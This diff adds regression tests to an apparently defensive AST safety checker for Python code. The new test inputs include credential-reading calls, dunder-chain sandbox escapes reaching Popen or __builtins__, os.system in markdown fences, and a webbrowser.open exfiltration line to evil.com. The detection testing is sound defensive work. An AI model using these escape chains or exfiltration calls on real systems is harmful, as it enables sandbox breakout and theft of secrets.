@@ -5,7 +5,7 @@ dangerous operations (shell injection, credential exfiltration), and handles eva
 vectors that regex screening cannot catch (alias tracking, dynamic imports, attribute
 chains).
 
-8 test groups, 57 cases:
+8 test groups, 68 cases:
   1. Evasion vectors (15)  — attacks that bypass regex but AST catches
   2. Alias tracking (5)    — import-as, from-import-as, chained aliases
   3. Markdown extraction (7) — fenced code blocks, heredocs, edge cases
@@ -13,7 +13,7 @@ chains).
   5. Syntax errors (3)     — malformed Python handled gracefully
   6. Backward compat (4)   — AST flags use same names as existing regex flags
   7. Performance (2)        — large inputs don't hang or OOM
-  8. Adversarial coverage (13) — S9: targeted tests for W12 fixes
+  8. Adversarial coverage (24) — S9 + W12.1: targeted tests for security fixes
 """
 
 from __future__ import annotations
@@ -470,3 +470,75 @@ class TestAdversarialW12:
         flags = check_ast_safety("import os\nhome = os.environ['HOME']")
         blocking = [f for f in flags if f in _BLOCKING_FLAGS]
         assert not blocking, f"False positive on safe environ key: {blocking}"
+
+    # --- W12.1: os.getenv credential exfiltration ---
+
+    def test_os_getenv_blocked_as_credential_exfil(self) -> None:
+        """os.getenv('SECRET_KEY') — credential exfil, not shell injection."""
+        flags = check_ast_safety("import os\nval = os.getenv('SECRET_KEY')")
+        assert "blocked.credential_exfil" in flags
+
+    # --- W12.1: os.environ.get/pop/setdefault ---
+
+    def test_os_environ_get_method_blocked(self) -> None:
+        """os.environ.get('PASSWORD') — credential exfiltration."""
+        flags = check_ast_safety("import os\npw = os.environ.get('PASSWORD')")
+        assert "blocked.credential_exfil" in flags
+
+    def test_os_environ_pop_method_blocked(self) -> None:
+        """os.environ.pop('API_KEY') — credential exfiltration."""
+        flags = check_ast_safety("import os\nk = os.environ.pop('API_KEY')")
+        assert "blocked.credential_exfil" in flags
+
+    # --- W12.1: Dunder attribute sandbox escapes ---
+
+    def test_dunder_subclasses_escape(self) -> None:
+        """().__class__.__bases__[0].__subclasses__() — reach Popen via MRO."""
+        src = "().__class__.__bases__[0].__subclasses__()"
+        flags = check_ast_safety(src)
+        assert "blocked.shell_injection" in flags
+
+    def test_dunder_globals_escape(self) -> None:
+        """f.__globals__['__builtins__'] — access module namespace."""
+        src = "f = lambda: None\nb = f.__globals__['__builtins__']"
+        flags = check_ast_safety(src)
+        assert "blocked.shell_injection" in flags
+
+    def test_dunder_code_access(self) -> None:
+        """f.__code__ — bytecode manipulation."""
+        src = "f = lambda: None\nc = f.__code__"
+        flags = check_ast_safety(src)
+        assert "blocked.shell_injection" in flags
+
+    # --- W12.1: Case-insensitive fence + python3/python2 aliases ---
+
+    def test_uppercase_python_fence_extracted(self) -> None:
+        """```Python (uppercase) should be extracted and checked."""
+        md = '```Python\nimport subprocess\nsubprocess.run(["ls"])\n```'
+        flags = check_python_blocks_safety(md)
+        assert "blocked.shell_injection" in flags
+
+    def test_python3_fence_extracted(self) -> None:
+        """```python3 should be extracted and checked."""
+        md = '```python3\nimport os\nos.system("id")\n```'
+        flags = check_python_blocks_safety(md)
+        assert "blocked.shell_injection" in flags
+
+    # --- W12.1: Additional dangerous modules ---
+
+    def test_webbrowser_open_exfil(self) -> None:
+        """webbrowser.open() — data exfiltration via URL."""
+        src = "import webbrowser\nwebbrowser.open('https://evil.com/?' + data)"
+        flags = check_ast_safety(src)
+        assert "blocked.credential_exfil" in flags
+
+    def test_globals_builtin_blocked(self) -> None:
+        """globals() — enables __import__ via dict subscription."""
+        flags = check_ast_safety("g = globals()\ng['__import__']('os')")
+        assert "blocked.shell_injection" in flags
+
+    def test_gc_module_blocked(self) -> None:
+        """gc.get_objects() — enumerates live objects in memory."""
+        src = "import gc\nobjs = gc.get_objects()"
+        flags = check_ast_safety(src)
+        assert "blocked.shell_injection" in flags
